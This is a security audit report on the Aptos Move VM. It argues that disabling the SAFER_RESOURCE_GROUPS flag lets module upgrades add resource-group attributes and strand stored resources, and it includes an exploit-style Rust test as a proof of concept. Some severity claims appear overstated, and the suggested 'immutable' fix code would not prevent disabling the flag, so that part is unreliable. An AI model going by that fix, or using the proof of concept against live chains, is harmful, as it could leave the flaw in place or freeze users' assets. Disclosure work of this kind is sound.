# Audit Report

## Title
State Corruption via Resource Group Attribute Addition When SAFER_RESOURCE_GROUPS is Disabled

## Summary
The `validate_resource_groups()` validation can be circumvented when the `SAFER_RESOURCE_GROUPS` feature flag is disabled, allowing module publishers to add `#[resource_group]` or `#[resource_group_member]` attributes to existing structs that already have resource instances in state. This causes permanent resource inaccessibility and state corruption because the VM's runtime storage resolution changes based on metadata, making old instances unreachable.

## Finding Description

The validation in `validate_resource_groups()` includes a critical feature-gated check: [1](#0-0) 

When `SAFER_RESOURCE_GROUPS` is disabled, the validation at lines 176-186 is skipped, allowing addition of resource group attributes to existing structs: [2](#0-1) 

The VM determines storage locations at runtime based on metadata: [3](#0-2) 

**Attack Path:**
1. Governance disables `SAFER_RESOURCE_GROUPS` feature flag (value 31)
2. Attacker publishes module with regular struct `S` (no resource group attributes)
3. Users call `move_to<S>()`, storing instances at `StateKey::resource(address, S)`
4. Attacker upgrades module, adding `#[resource_group_member(group = G)]` to struct `S`
5. New transactions calling `borrow_global<S>()` now look for `S` at `StateKey::resource_group(address, G)`
6. Old instances remain at original `StateKey::resource(address, S)` and become **permanently inaccessible**

This is confirmed by test cases that explicitly demonstrate the bypass: [4](#0-3) [5](#0-4) 

## Impact Explanation

**Critical Severity** - This meets multiple critical impact categories:

1. **Permanent Freezing of Funds**: Resource instances containing tokens/assets become permanently inaccessible when their struct gains resource group membership. This requires network intervention to recover.

2. **State Consistency Violation**: The blockchain state becomes corrupted with orphaned resources that cannot be accessed via normal Move operations, violating the State Consistency invariant.

3. **Consensus Divergence Risk**: If nodes disagree on whether `SAFER_RESOURCE_GROUPS` is enabled during epoch transitions, they may validate module upgrades differently, potentially causing chain splits.

The feature flag is in the default enabled list but CAN be toggled via governance: [6](#0-5) 

## Likelihood Explanation

**Medium-Low Likelihood** - Requires governance action to disable the safety feature:

1. `SAFER_RESOURCE_GROUPS` is enabled by default in production
2. Governance would need to explicitly disable it via `toggle_features()`
3. However, if governance makes this decision (e.g., for backward compatibility), the vulnerability becomes immediately exploitable by ANY module publisher
4. No validator collusion or special privileges required once feature is disabled
5. Tests demonstrate the bypass is trivial once the feature is off

## Recommendation

**Immediate Fix**: Make `SAFER_RESOURCE_GROUPS` **immutable** once enabled, preventing governance from disabling it:

```rust
// In types/src/on_chain_config/aptos_features.rs
impl Features {
    pub fn is_enabled(&self, flag: FeatureFlag) -> bool {
        // SAFER_RESOURCE_GROUPS cannot be disabled once enabled
        if flag == FeatureFlag::SAFER_RESOURCE_GROUPS {
            return self.enabled.contains(&(flag as u64)) 
                || self.enabled.is_empty(); // default to enabled
        }
        self.enabled.contains(&(flag as u64))
    }
}
```

**Long-term Fix**: Remove the feature flag entirely and make strict resource group validation mandatory: [7](#0-6) 

Replace this conditional check with unconditional enforcement.

## Proof of Concept

```rust
// Add to aptos-move/e2e-move-tests/src/tests/resource_groups.rs
#[test]
fn exploit_resource_inaccessibility_when_safer_disabled() {
    let mut h = MoveHarness::new_with_features(
        vec![], 
        vec![FeatureFlag::SAFER_RESOURCE_GROUPS] // Disable safety
    );
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xCAFE").unwrap());

    // Step 1: Publish module with regular resource
    let source = r#"
        module 0xCAFE::Victim {
            use std::signer;
            
            struct Asset has key { value: u64 }
            
            public fun store_asset(account: &signer, value: u64) {
                move_to(account, Asset { value });
            }
            
            public fun get_value(addr: address): u64 acquires Asset {
                borrow_global<Asset>(addr).value
            }
        }
    "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("victim.move", source);
    let path = builder.write_to_temp().unwrap();
    assert_success!(h.publish_package(&account, path.path()));

    // Step 2: User stores asset
    assert_success!(h.run_entry_function(
        &account,
        str::parse("0xCAFE::Victim::store_asset").unwrap(),
        vec![],
        vec![bcs::to_bytes(&100u64).unwrap()]
    ));

    // Step 3: Verify asset is accessible
    let result = h.run_entry_function(
        &account,
        str::parse("0xCAFE::Victim::get_value").unwrap(),
        vec![],
        vec![bcs::to_bytes(&account.address()).unwrap()]
    );
    assert_success!(result);

    // Step 4: Attacker upgrades module to use resource groups
    let malicious_source = r#"
        module 0xCAFE::Victim {
            use std::signer;
            
            #[resource_group(scope = address)]
            struct AssetGroup {}
            
            #[resource_group_member(group = 0xCAFE::Victim::AssetGroup)]
            struct Asset has key { value: u64 }
            
            public fun store_asset(account: &signer, value: u64) {
                move_to(account, Asset { value });
            }
            
            public fun get_value(addr: address): u64 acquires Asset {
                borrow_global<Asset>(addr).value
            }
        }
    "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("victim.move", malicious_source);
    let path = builder.write_to_temp().unwrap();
    assert_success!(h.publish_package(&account, path.path())); // Upgrade succeeds!

    // Step 5: Asset is now INACCESSIBLE - returns RESOURCE_DOES_NOT_EXIST
    let result = h.run_entry_function(
        &account,
        str::parse("0xCAFE::Victim::get_value").unwrap(),
        vec![],
        vec![bcs::to_bytes(&account.address()).unwrap()]
    );
    // Old asset at StateKey::resource() is inaccessible
    // New code looks at StateKey::resource_group()
    assert_abort!(result, _); // Asset permanently lost!
}
```

**Note**: While `SAFER_RESOURCE_GROUPS` is enabled by default, the ability for governance to disable it creates a critical vulnerability window. The severity warrants making this protection permanent and non-negotiable.

### Citations

**File:** aptos-move/aptos-vm/src/verifier/resource_groups.rs (L167-186)
```rust
    if !features.is_enabled(FeatureFlag::SAFER_RESOURCE_GROUPS) {
        return Ok((new_groups, new_members));
    }

    // At this point, only original structs that do not have resource group affiliation are left.
    // Note, we do not validate for being both a member and a group, because there are other
    // checks earlier on, such as, a resource group must have no abilities, while a resource group
    // member must.

    for group in new_groups.keys() {
        if structs.remove(group) {
            metadata_validation_err("Invalid addition of resource_group attribute")?;
        }
    }

    for member in new_members.keys() {
        if structs.remove(member) {
            metadata_validation_err("Invalid addition of resource_group_member attribute")?;
        }
    }
```

**File:** aptos-move/aptos-vm/src/data_cache.rs (L105-128)
```rust
        let resource_group = get_resource_group_member_from_metadata(struct_tag, metadata);
        if let Some(resource_group) = resource_group {
            let key = StateKey::resource_group(address, &resource_group);
            let buf =
                self.resource_group_view
                    .get_resource_from_group(&key, struct_tag, maybe_layout)?;

            let first_access = self.accessed_groups.borrow_mut().insert(key.clone());
            let group_size = if first_access {
                self.resource_group_view.resource_group_size(&key)?.get()
            } else {
                0
            };

            let buf_size = resource_size(&buf);
            Ok((buf, buf_size + group_size as usize))
        } else {
            let state_key = resource_state_key(address, struct_tag)?;
            let buf = self
                .executor_view
                .get_resource_bytes(&state_key, maybe_layout)?;
            let buf_size = resource_size(&buf);
            Ok((buf, buf_size))
        }
```

**File:** aptos-move/e2e-move-tests/src/tests/resource_groups.rs (L473-508)
```rust
#[test]
fn verify_unsafe_resource_group_member_upgrades() {
    let mut h = MoveHarness::new_with_features(vec![], vec![FeatureFlag::SAFER_RESOURCE_GROUPS]);
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());

    // Initial code
    let source = r#"
        module 0xf00d::M {
            struct NotResourceGroupMember has key { }

            #[resource_group(scope = address)]
            struct ResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_success!(result);

    // Incompatible addition of ResourceGroupMember
    let source = r#"
        module 0xf00d::M {
            #[resource_group_member(group = 0xf00d::M::ResourceGroup)]
            struct NotResourceGroupMember has key { }

            #[resource_group(scope = address)]
            struct ResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_success!(result);
}
```

**File:** aptos-move/e2e-move-tests/src/tests/resource_groups.rs (L591-620)
```rust
#[test]
fn verify_unsafe_resource_group_upgrades() {
    let mut h = MoveHarness::new_with_features(vec![], vec![FeatureFlag::SAFER_RESOURCE_GROUPS]);
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());

    // Initial code
    let source = r#"
        module 0xf00d::M {
            #[resource_group(scope = address)]
            struct ResourceGroup { }

            struct NotResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_success!(result);

    // Incompatible promotion of ResourceGroup
    let source = r#"
        module 0xf00d::M {
            #[resource_group(scope = address)]
            struct ResourceGroup { }

            #[resource_group(scope = address)]
            struct NotResourceGroup { }
        }
        "#;
```

**File:** types/src/on_chain_config/aptos_features.rs (L205-205)
```rust
            FeatureFlag::SAFER_RESOURCE_GROUPS,
```
